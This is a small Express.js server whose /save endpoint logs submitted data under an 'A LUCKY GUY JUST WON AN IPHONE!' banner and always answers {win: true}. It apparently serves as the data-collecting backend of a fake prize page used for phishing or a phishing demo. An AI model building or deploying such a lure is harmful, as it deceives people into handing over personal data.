const express = require('express');
const bodyParser = require('body-parser');
const app = express();

const port = process.env.PORT || 3000;

app.use(express.static('public'));
app.use(bodyParser.json());

app.post('/save', (req, res) => {
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');

  console.log('***** A LUCKY GUY JUST WON AN IPHONE! *****');
  console.dir(req.body.data);
  console.log('*******************************************');
  console.log(' ');
  console.log(' ');

  res.json({
    win: true,
  });
});

app.listen(port, () => console.log(`Express server listening on port ${port}!`));
